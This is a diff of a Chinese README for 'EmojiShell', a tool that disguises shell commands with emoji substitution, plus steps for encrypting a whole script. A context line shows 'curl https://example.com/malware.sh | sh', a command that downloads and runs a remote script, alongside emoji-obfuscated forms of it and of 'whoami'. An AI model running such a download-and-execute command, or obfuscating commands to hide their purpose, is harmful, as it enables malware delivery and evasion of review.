@@ -35,7 +35,7 @@ EmojiCode
 curl https://example.com/malware.sh | sh
 
 # EmojiShell 版本
-${🐚}t${☕}p${🌐}s://${🔒}x${📡}m${🔍}l${🚪}.com/${💻}l${🖥}e.sh | ${💻}h
+$(🐚)$(☕)$(🌐) $(📡)$(🔍)$(🚪)$(💻) | $(💻)
 - 可扩展性：
    - 兼容 
 "zsh"/
@@ -49,10 +49,12 @@ cd EmojiShell && chmod +x install.sh
 
 # 混淆示例
 echo "whoami" | ./emoji-obfuscator --level hard
-# 输出：👤${🔑}who${🔒}ami${🔓}
+# 输出：$(📡)$(🔍)$(🚪)$(💻)
 
 # 生成全加密脚本
-暂时不建议
+修改 EmojiCode.sh 文件中指定的加密文件路径
+`text="example.sh" #原脚本绝对路径`
+将 example.sh 替换为你要加密的shell文件路径后执行加密脚本即可
 
 🛡️ 应用场景
 
